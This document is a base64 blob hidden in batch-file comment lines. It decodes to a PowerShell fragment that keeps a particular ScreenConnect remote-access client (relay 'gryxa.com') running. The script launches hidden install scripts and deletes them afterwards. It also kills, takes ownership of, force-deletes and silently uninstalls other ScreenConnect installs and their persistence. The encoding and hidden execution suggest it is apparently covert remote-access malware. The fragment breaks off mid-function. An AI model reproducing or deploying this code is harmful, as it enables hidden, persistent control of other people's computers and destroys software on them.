::cyArPSAic2MgZmFpbHVyZSBgIiRzdmNOYW1lYCIgcmVzZXQ9IDg2NDAwIGFjdGlv
::bnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwIg0KICAg
::ICRsaW5lcyArPSAic2Mgc3RhcnQgYCIkc3ZjTmFtZWAiIg0KICAgIGZvcmVhY2gg
::KCRzayBpbiAoR2V0LVNldnJ6S2VlcCkpIHsNCiAgICAgICAgJGxpbmVzICs9ICJz
::YyBjb25maWcgYCJTY3JlZW5Db25uZWN0IENsaWVudCAoJHNrKWAiIHN0YXJ0PSBh
::dXRvID5udWwgMj4mMSINCiAgICAgICAgJGxpbmVzICs9ICJzYyBzdGFydCBgIlNj
::cmVlbkNvbm5lY3QgQ2xpZW50ICgkc2spYCIgPm51bCAyPiYxIg0KICAgIH0NCiAg
::ICAkcmVzdWx0RmlsZSA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfaW5zdGFs
::bC5yZXN1bHQnDQogICAgJGxpbmVzICs9ICJlY2hvICVFUlJPUkxFVkVMJT5gIiRy
::ZXN1bHRGaWxlYCIiDQogICAgJGxpbmVzICs9ICJkZWwgL2YgL3EgYCIkc2FmZU1z
::aWAiID5udWwgMj4mMSINCiAgICAkbGluZXMgKz0gImRlbCAvZiAvcSBgIiRjbWRg
::IiA+bnVsIDI+JjEiDQogICAgJGxpbmVzICs9ICdleGl0Jw0KICAgIFNldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkY21kIC1WYWx1ZSAkbGluZXMgLUVuY29kaW5nIEFT
::Q0lJIC1Gb3JjZQ0KICAgIFN0YXJ0LVByb2Nlc3MgY21kLmV4ZSAtQXJndW1lbnRM
::aXN0ICIvYyBgIiRjbWRgIiIgLVdpbmRvd1N0eWxlIEhpZGRlbg0KfQ0KDQpmdW5j
::dGlvbiBNYXJrLUdyeXhhUmVpbnN0YWxsIHsNCiAgICBTZXQtQ29udGVudCAtTGl0
::ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfcmVpbnN0YWxsLmZs
::YWcnKSAtVmFsdWUgKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmlu
::ZygnbycpIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UNCn0NCg0KZnVuY3Rpb24gR2V0
::LUdyeXhhTWlncmF0ZU9sZFBhdGggeyBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhh
::X21pZ3JhdGVfb2xkLnR4dCcgfQ0KDQpmdW5jdGlvbiBTYXZlLUdyeXhhTWlncmF0
::ZU9sZChbc3RyaW5nW11dJE9sZEZwcywgW3N0cmluZ10kTmV3RnApIHsNCiAgICAk
::b2xkcyA9IEAoJE9sZEZwcyB8IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgKCRfIC1u
::ZSAkTmV3RnApIH0gfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpDQogICAgaWYgKC1u
::b3QgJG9sZHMuQ291bnQpIHsNCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQ
::YXRoIChHZXQtR3J5eGFNaWdyYXRlT2xkUGF0aCkgLUZvcmNlIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICBT
::ZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEdldC1Hcnl4YU1pZ3JhdGVPbGRQYXRo
::KSAtVmFsdWUgJG9sZHMgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQ0KfQ0KDQpmdW5j
::dGlvbiBDb21wbGV0ZS1Hcnl4YU1pZ3JhdGVPbGQgew0KICAgICMgTDQ0OiBORVZF
::UiBhdXRvLXVuaW5zdGFsbCBvbGQgR3J5eGEgRlAg4oCUIHRoYXQgZHJvcHBlZCBs
::aXZlIEd1ZXN0cyBzdGlsbCBvbiBvbGQgRlAuDQogICAgIyBLZWVwIHRoZSBmbGFn
::IGZvciB2aXNpYmlsaXR5OyBvcGVyYXRvci9tYW51YWwgY2xlYW51cCBvbmx5Lg0K
::ICAgICRwID0gR2V0LUdyeXhhTWlncmF0ZU9sZFBhdGgNCiAgICBpZiAoLW5vdCAo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkpIHsgcmV0dXJuIH0NCiAgICAkbG9n
::ID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9lbnN1cmUubG9nJw0KICAgIEFk
::ZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoJ3swfSBtaWdyYXRl
::X2NsZWFudXBfU0tJUFBFRF9MNDQgKGtlZXAgZHVhbC1GUDsgbmV2ZXIgL3ggbGl2
::ZSBHcnl4YSknIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1t
::OnNzJykpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgUmVtb3Zl
::LUl0ZW0gLUxpdGVyYWxQYXRoICRwIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KfQ0KDQpmdW5jdGlvbiBTdGFydC1Hcnl4YU1pZ3JhdGUoW3N0
::cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kTmV3RnAsIFtzdHJpbmdbXV0kT2xkRnBz
::LCBbc3RyaW5nXSRSZWFzb24pIHsNCiAgICAjIEw0Mjogc2libGluZy1zYWZlIC9p
::IG9mIE5ld0ZwIEZJUlNUIOKAlCBrZWVwIE9sZEZwcyBSdW5uaW5nIHVudGlsIENv
::bXBsZXRlLUdyeXhhTWlncmF0ZU9sZC4NCiAgICBTYXZlLUdyeXhhTWlncmF0ZU9s
::ZCAkT2xkRnBzICROZXdGcA0KICAgIENsZWFyLUdyeXhhQXJwICROZXdGcA0KICAg
::IFNldC1Hcnl4YUZwICROZXdGcA0KICAgIFN0YXJ0LUdyeXhhSW5zdGFsbCAkTXNp
::UGF0aCAkTmV3RnAgKEpvaW4tUGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2RldGFj
::aGVkLmxvZycpDQogICAgTWFyay1Hcnl4YVJlaW5zdGFsbA0KICAgIHJldHVybiAi
::SU5GTElHSFR8JE5ld0ZwfCRSZWFzb24iDQp9DQoNCmZ1bmN0aW9uIEludm9rZS1H
::cnl4YUVuc3VyZSB7DQogICAgIyBMNDYgRlJFRVpFOiBuZXZlciBtc2lleGVjIGZy
::b20gbW9uL2Jvb3QvZm9yY2UtZmxhZy4gU3RhcnQtb25seS4gTWFudWFsIG93bl9n
::cnl4YV9mb3JjZSBmb3IgaW5zdGFsbC4NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRo
::IC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsgTmV3LUl0ZW0gLUl0ZW1UeXBlIERp
::cmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2UgfCBPdXQtTnVsbCB9DQogICAg
::JGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfZW5zdXJlLmxvZycNCiAg
::ICBmdW5jdGlvbiBHTG9nKFtzdHJpbmddJG0pIHsgQWRkLUNvbnRlbnQgLUxpdGVy
::YWxQYXRoICRsb2cgLVZhbHVlICgnezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3Jt
::YXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0pIC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlIH0NCg0KICAgIGZvcmVhY2ggKCRzdGFsZSBpbiBAKCdncnl4
::YV9pbnN0YWxsLmNtZCcsICdncnl4YV9tc2kubG9jaycsICdvd25fZ3J5eGEubG9j
::aycpKSB7DQogICAgICAgICRwID0gSm9pbi1QYXRoICRXb3JrRGlyICRzdGFsZQ0K
::ICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAg
::ICAgICAgR0xvZyAibDQ2X2Fib3J0X3N0YWxlICRzdGFsZSINCiAgICAgICAgICAg
::IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkcCAtRm9yY2UgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICRmcCA9
::IEdldC1Hcnl4YUZwDQogICAgJGV4cCA9ICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZw
::DQogICAgaWYgKC1ub3QgJGV4cCkgeyAkZXhwID0gJGZwIH0NCg0KICAgICRydW5u
::aW5nID0gRmluZC1SdW5uaW5nR3J5eGFGcA0KICAgIGlmICgkcnVubmluZykgew0K
::ICAgICAgICBTZXQtR3J5eGFGcCAkcnVubmluZw0KICAgICAgICBHTG9nICJsNDZf
::bGl2ZV9vayBmcD0kcnVubmluZyBmb3JjZT0kRm9yY2UgZGVlcD0kRGVlcCINCiAg
::ICAgICAgaWYgKCREZWVwKSB7DQogICAgICAgICAgICAkdGNwUiA9IFRlc3QtVGNw
::SG9zdFBvcnQgJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA0NDMNCiAgICAgICAgICAg
::ICR0Y3BVID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhVWlIb3N0IDQ0
::Mw0KICAgICAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRydW5uaW5nfHJ1bm5pbmc9
::MXxkZWVwPTF8cmVsYXk9JHRjcFJ8dWk9JHRjcFV8ZnJlZXplPTEiDQogICAgICAg
::IH0NCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRydW5uaW5nfHJ1bm5pbmc9MXxm
::cmVlemU9MSINCiAgICB9DQoNCiAgICBmb3JlYWNoICgkdHJ5RnAgaW4gQCgkZXhw
::LCAkZnApIHwgV2hlcmUtT2JqZWN0IHsgJF8gfSB8IFNlbGVjdC1PYmplY3QgLVVu
::aXF1ZSkgew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1TY1NlcnZpY2VFeGlzdHMg
::JHRyeUZwKSkgeyBjb250aW51ZSB9DQogICAgICAgICRuYW1lID0gIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICgkdHJ5RnApIg0KICAgICAgICBHTG9nICJsNDZfc3RhcnRf
::b25seSBmcD0kdHJ5RnAiDQogICAgICAgICYgc2MuZXhlIGNvbmZpZyAkbmFtZSBz
::dGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBzYy5leGUgc3Rh
::cnQgJG5hbWUgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1T
::ZWNvbmRzIDUNCiAgICAgICAgaWYgKFRlc3QtU2NSdW5uaW5nICR0cnlGcCkgew0K
::ICAgICAgICAgICAgU2V0LUdyeXhhRnAgJHRyeUZwDQogICAgICAgICAgICByZXR1
::cm4gIkhFQUxUSFl8JHRyeUZwfHN0YXJ0ZWQ9MXxmcmVlemU9MSINCiAgICAgICAg
::fQ0KICAgIH0NCg0KICAgIEdMb2cgImw0Nl9hYnNlbnRfbm9fYXV0b19pbnN0YWxs
::IHRhcmdldD0kZXhwIg0KICAgIHJldHVybiAiVU5IRUFMVEhZfCRleHB8YWJzZW50
::LWZyZWV6ZS1uby1pbnN0YWxsIg0KfQ0KDQpmdW5jdGlvbiBJbnZva2UtRXh0ZXJt
::aW5hdGUgew0KICAgICMgTDQ1OiBIQU5EUy1PRkYg4oCUIGRvIG5vdCB0b3VjaCBh
::bnkgU2NyZWVuQ29ubmVjdCB3aGlsZSBkaWFnbm9zaW5nIGRpc2Nvbm5lY3RzLg0K
::ICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2V4dGVybWluYXRlLmxvZycN
::CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCd7MH0g
::ZXh0ZXJtaW5hdGVfU0tJUFBFRF9MNDUgaGFuZHMtb2ZmLWFsbC1zYycgLWYgKEdl
::dC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSkgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUNCiAgICByZXR1cm4gJ1NLSVB8aGFuZHMtb2Zm
::LXNjLUw0NScNCiAgICAjIEw3OiB0cnVlIHJlbW92YWwgKGRpc2FibGVkKS4uLg0K
::ICAgICRydW5uaW5nRyA9IEZpbmQtUnVubmluZ0dyeXhhRnANCiAgICBpZiAoJHJ1
::bm5pbmdHKSB7IFNldC1Hcnl4YUZwICRydW5uaW5nRyB9DQogICAgJGtlZXAgPSBA
::KEdldC1LZWVwRmluZ2VycHJpbnRzKQ0KICAgICRuID0gQHsgc3ZjID0gMDsgcHJv
::YyA9IDA7IGRpciA9IDA7IHByb2R1Y3QgPSAwOyBybW0gPSAwOyBmYWlsID0gMCB9
::DQogICAgZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0pIHsNCiAgICAgICAgJGxpbmUg
::PSAnezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6
::bW06c3MnKSwgJG0NCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRs
::b2cgLVZhbHVlICRsaW5lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQog
::ICAgICAgICMgTzQxOiBkbyBOT1QgV3JpdGUtT3V0cHV0IExvZyBsaW5lcyAocG9s
::bHV0ZXMgZm9yIC9mIGNhbGxlcnMpDQogICAgfQ0KICAgICMgUHJvdGVjdCBHcnl4
::YSBkdXJpbmcgc3RhcnQgcmFjZTogb25seSBsaXZlIFNDIHByb2NzIHdpdGggdmVy
::aWZpZWQgR3J5eGEgcmVsYXkvRlANCiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
::UHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICRibG9iID0gIiQoW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aCkgJChb
::c3RyaW5nXSRfLkNvbW1hbmRMaW5lKSINCiAgICAgICAgaWYgKCRibG9iIC1tYXRj
::aCAnU2NyZWVuQ29ubmVjdCBDbGllbnQgXCgoWzAtOWEtZkEtRl17MTZ9KVwpJykg
::ew0KICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAg
::ICAgICAgICBpZiAoJGZwIC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCAtYW5kIChU
::ZXN0LUlzR3J5eGFGcCAkZnApIC1hbmQgJGZwIC1ub3RpbiAka2VlcCkgew0KICAg
::ICAgICAgICAgICAgICRrZWVwICs9ICRmcA0KICAgICAgICAgICAgICAgIFNldC1H
::cnl4YUZwICRmcA0KICAgICAgICAgICAgICAgIExvZyAia2VlcF9hZGRfZnJvbV9w
::cm9jIGZwPSRmcCINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAg
::ICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgew0KICAgICAgICBpZiAo
::LW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAgICAgIyBhbGxvdyBpZiBy
::ZWxheSBzZXJ2ZXIvZG9tYWluIGlzIEdyeXhhIE9SIGZpbmdlcnByaW50IGlzIGEg
::a2VlcGVyDQogICAgICAgIGlmICgkcyAtbWF0Y2ggJyg/aSlncnl4YVwuY29tJykg
::eyByZXR1cm4gJHRydWUgfQ0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcCkg
::eyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAg
::ICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCiAgICBmdW5jdGlvbiBGb3JjZS1SZW1v
::dmVEaXIoW3N0cmluZ10kZCkgew0KICAgICAgICBpZiAoLW5vdCAkZCAtb3IgLW5v
::dCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgcmV0dXJuICR0cnVlIH0N
::CiAgICAgICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0
::IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFuZCAkXy5FeGVjdXRhYmxlUGF0aC5TdGFy
::dHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9yZGluYWxJZ25vcmVDYXNl
::KSB9IHwNCiAgICAgICAgICAgIEZvckVhY2gtT2JqZWN0IHsgU3RvcC1Qcm9jZXNz
::IC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlIH0NCiAgICAgICAgIyB1bi1oYXJkIHNlbGYtcHJvdGVjdGVkIGRpcnMg
::KGZvcmVpZ24vb2xkIFNDIGxvY2tzIEFDTHMrYXR0cnMgdG8gc3Vydml2ZSByZW1v
::dmFsKQ0KICAgICAgICAmIHRha2Vvd24uZXhlIC9GICRkIC9SIC9EIFkgMj4mMSB8
::IE91dC1OdWxsDQogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvcmVzZXQgL1QgL0Mg
::L1EgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAt
::aCAtcyAtciAvcyAvZCBgIiRkYCIgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxs
::DQogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJypTLTEtNS0zMi01NDQ6
::KE9JKShDSSlGJyAvVCAvQyAvUSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBp
::Y2FjbHMuZXhlICRkIC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGJyAv
::VCAvQyAvUSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBpY2FjbHMuZXhlICRk
::IC9ncmFudCAnU1lTVEVNOihPSSkoQ0kpRicgL1QgL0MgL1EgMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJz
::ZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAg
::aWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsNCiAgICAgICAgICAgIGNt
::ZC5leGUgL2MgImF0dHJpYiAtaCAtcyAtciAvcyAvZCBgIiRkXCouKmAiIiAyPiYx
::IHwgT3V0LU51bGwNCiAgICAgICAgICAgIGNtZC5leGUgL2MgInJtZGlyIC9zIC9x
::IGAiJGRgIiIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIH0NCiAgICAgICAgaWYg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsNCiAgICAgICAgICAgICRlbXB0
::eSA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiArIFtndWlkXTo6
::TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpDQogICAgICAgICAgICBOZXctSXRlbSAt
::SXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRlbXB0eSAtRm9yY2UgfCBPdXQtTnVs
::bA0KICAgICAgICAgICAgJiByb2JvY29weS5leGUgJGVtcHR5ICRkIC9NSVIgL1I6
::MCAvVzowIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0g
::LUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUNCiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAk
::ZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gLW5vdCAoVGVzdC1QYXRoIC1MaXRl
::cmFsUGF0aCAkZCkNCiAgICB9DQogICAgZnVuY3Rpb24gVW5pbnN0YWxsLVByb2R1
::Y3RLZXkoJGtleSkgew0KICAgICAgICAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWUN
::CiAgICAgICAgJHByb3AgPSBHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICRkbiA9ICRwcm9w
::LkRpc3BsYXlOYW1lDQogICAgICAgICMgTDM5L0w0NDogcmVmdXNlIC94IGlmIERp
::c3BsYXlOYW1lIEZQIGlzIGEga2VlcGVyIE9SIEdyeXhhIFByb2R1Y3RDb2RlIChz
::aGFyZWQgR1VJRCBraWxscyBHdWVzdCkNCiAgICAgICAgaWYgKCRndWlkIC1lcSAn
::ezlEN0NDNDE4LUEzNTYtOTY5My1EQ0M1LTQxRUM0NEQwM0IzMX0nKSB7DQogICAg
::ICAgICAgICBMb2cgInByb2R1Y3Rfc2tpcF9ncnl4YV9wcm9kdWN0Y29kZSBndWlk
::PSRndWlkIg0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQog
::ICAgICAgIGlmICgkZG4gLW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVudCBcKChb
::MC05YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAgICAgICAkZnBEbiA9ICRNYXRj
::aGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcERuIC1pbiAka2Vl
::cCAtb3IgKFRlc3QtSXNHcnl4YUZwICRmcERuKSkgew0KICAgICAgICAgICAgICAg
::IExvZyAicHJvZHVjdF9za2lwX2tlZXBlcl9mcCBbJGRuXSBndWlkPSRndWlkIg0K
::ICAgICAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgfQ0KICAgICAgICBpZiAoJGd1aWQgLWxpa2UgJ3sqfScpIHsNCiAgICAg
::ICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRM
::aXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJl
::c3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuDQogICAgICAg
::ICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlkPSRndWlkIGV4aXQ9
::JCgkcC5FeGl0Q29kZSkiDQogICAgICAgICAgICBpZiAoJHAuRXhpdENvZGUgLWlu
::IDAsIDE2MDUsIDE2MTQsIDMwMTApIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAg
::fQ0KICAgICAgICAkdXMgPSAkcHJvcC5Vbmluc3RhbGxTdHJpbmcNCiAgICAgICAg
::aWYgKCR1cykgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBp
::ZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7DQogICAgICAgICAgICAgICAg
::ICAgICRhcmdzID0gKCR1cyAtcmVwbGFjZSAnKD9pKV4uKm1zaWV4ZWMoXC5leGUp
::P1xzKicsICcnKQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJGFyZ3MgLW5vdG1h
::dGNoICcvcW4nKSB7ICRhcmdzID0gIiRhcmdzIC9xbiAvbm9yZXN0YXJ0IiB9DQog
::ICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4
::ZSAtQXJndW1lbnRMaXN0ICRhcmdzIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5
::bGUgSGlkZGVuDQogICAgICAgICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmlu
::c3RhbGxzdHJpbmdfbXNpIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiDQogICAg
::ICAgICAgICAgICAgICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUs
::IDE2MTQsIDMwMTApDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAg
::ICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50
::TGlzdCAiL2MgJHVzIC9TIC9zaWxlbnQgL3F1aWV0IC9xbiIgLVdhaXQgLVBhc3NU
::aHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4NCiAgICAgICAgICAgICAgICAgICAgTG9n
::ICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4
::aXRDb2RlKSINCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29k
::ZSAtZXEgMCkNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNo
::IHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlMIFskZG5dICRfIiB9
::DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCg0KICAg
::ICMg4pSA4pSAIGRlc3Ryb3kgZm9yZWlnbi9vbGQgU0MgcGVyc2lzdGVuY2UgKHdh
::dGNoZG9nIHRhc2tzICsgcnVuIGtleXMpIOKUgOKUgA0KICAgICMgUm9vdCBjYXVz
::ZSBvZiAiY29ubmVjdHMgdGhlbiBkcm9wcyI6IGEgbm9uLWtlZXBlciAvIG9sZC1G
::UCBTY3JlZW5Db25uZWN0IGtlZXBzIGENCiAgICAjIHNjaGVkdWxlZCB0YXNrIG9y
::IFJ1biBrZXkgdGhhdCByZS1ydW5zIGl0cyBjYWNoZWQgbXNpZXhlYyAvaS4gRXZl
::cnkgc3VjaCAvaSBmaXJlcw0KICAgICMgUmVtb3ZlRXhpc3RpbmdQcm9kdWN0cyBv
::biB0aGUgU0hBUkVEIFNDIFVwZ3JhZGVDb2RlIGFuZCBzdHJpcHMgdGhlIGtlZXBl
::ciBHcnl4YS4NCiAgICAjIFJlbW92aW5nIG9ubHkgdGhlIHByb2R1Y3QgaXMgbm90
::IGVub3VnaCDigJQgdGhlIHBlcnNpc3RlbmNlIHJlaW5zdGFsbHMgaXQgKGFuZCBr
::aWxscw0KICAgICMgR3J5eGEgYWdhaW4pLiBQdXJnZSB0aGUgcGVyc2lzdGVuY2Ug
::RklSU1Qgc28gcHJvZHVjdC9zdmMvZGlyIHJlbW92YWwgaXMgcGVybWFuZW50Lg0K
::ICAgIGZ1bmN0aW9uIEdldC1Ob25LZWVwZXJTY0ZwcyB7DQogICAgICAgICRmcHMg
::PSBAe30NCiAgICAgICAgR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8u
::TmFtZSAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlhLWZBLUZd
::ezE2fSlcKScpIHsNCiAgICAgICAgICAgICAgICAkZnBzWyRtYXRjaGVzWzFdLlRv
::TG93ZXIoKV0gPSAkdHJ1ZQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAg
::ICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUg
::bGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgiJChbc3Ry
::aW5nXSRfLkV4ZWN1dGFibGVQYXRoKSAkKFtzdHJpbmddJF8uQ29tbWFuZExpbmUp
::IiAtbWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAgICAgICAgICAg
::ICAgICAkZnBzWyRtYXRjaGVzWzFdLlRvTG93ZXIoKV0gPSAkdHJ1ZQ0KICAgICAg
::ICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRyb290IGluICRz
::Y3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAgICAgIGlmICgtbm90IChU
::ZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgICAgIEdldC1D
::aGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
::b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGRuID0gKEdldC1JdGVt
::UHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::KS5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgICAgIGlmICgkZG4gLW1hdGNoICdT
::Y3JlZW5Db25uZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7ICRm
::cHNbJG1hdGNoZXNbMV0uVG9Mb3dlcigpXSA9ICR0cnVlIH0NCiAgICAgICAgICAg
